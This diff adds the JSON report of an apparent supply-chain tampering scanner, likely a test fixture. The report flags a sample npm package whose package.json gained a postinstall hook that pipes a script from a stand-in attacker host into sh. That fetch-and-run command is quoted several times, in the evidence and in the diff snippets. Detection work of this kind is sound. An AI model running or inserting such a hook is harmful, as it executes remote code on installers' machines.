@@ -1,0 +1,63 @@
+{
+  "package_name": "tampered_manifest",
+  "version": "1.0.0",
+  "ecosystem": "npm",
+  "source_ref": "upstream",
+  "archive_sha256": "98a57a328f62ce4196cdb70c370bfbfb11917b0f381fbb79eb98254cc7936b51",
+  "provenance_verified": false,
+  "summary_counts": {
+    "identical": 1,
+    "expected_artifacts": 0,
+    "stripped_dev_files": 0,
+    "suspicious": 2,
+    "critical": 0
+  },
+  "verdict": "TAMPERED",
+  "model_used": "deterministic-static-fallback",
+  "findings": [
+    {
+      "file_path": "package.json",
+      "classification": "SUSPICIOUS_MANIFEST",
+      "severity": "HIGH",
+      "verdict": "TAMPERED",
+      "entropy": null,
+      "evidence": [
+        "Lifecycle hook modified: postinstall: 'curl -s https://evil.example.invalid/exfil.sh | sh' (upstream was: 'None')"
+      ],
+      "diff_snippet": "+ \"postinstall: 'curl -s https://evil.example.invalid/exfil.sh | sh' (upstream was: 'None')\"",
+      "explanation": "Unauthorized lifecycle hook in package.json: postinstall: 'curl -s https://evil.example.invalid/exfil.sh | sh' (upstream was: 'None'). Commands execute automatically upon 'npm install' and do not match source repository.",
+      "archetype": "CASE_2_MANIFEST_TAMPERING",
+      "file": "package.json",
+      "status": "SUSPICIOUS_MANIFEST",
+      "category": "MANIFEST_LIFECYCLE_TAMPERING"
+    },
+    {
+      "file_path": "package.json",
+      "classification": "MODIFIED_SOURCE",
+      "severity": "HIGH",
+      "verdict": "TAMPERED",
+      "entropy": null,
+      "evidence": [
+        "Differences in code",
+        "New capabilities: network: https, http"
+      ],
+      "diff_snippet": "--- source/package.json\n\n+++ package/package.json\n\n@@ -3,6 +3,7 @@\n\n   \"version\": \"1.0.0\",\n   \"main\": \"index.js\",\n   \"scripts\": {\n-    \"test\": \"echo ok\"\n+    \"test\": \"echo ok\",\n+    \"postinstall\": \"curl -s https://evil.example.invalid/exfil.sh | sh\"\n   }\n }",
+      "explanation": "Source file 'package.json' was modified in the published release archive.",
+      "archetype": "CASE_2_MANIFEST_TAMPERING",
+      "file": "package.json",
+      "status": "MODIFIED_SOURCE",
+      "category": "MANIFEST_LIFECYCLE_TAMPERING"
+    }
+  ],
+  "summary": {
+    "suspicious_findings": 2,
+    "expected_build_artifacts": 0,
+    "identical_files": 1,
+    "identical": 1,
+    "expected_artifacts": 0,
+    "stripped_dev_files": 0,
+    "suspicious": 2,
+    "critical": 0
+  },
+  "risk_score": 75
+}
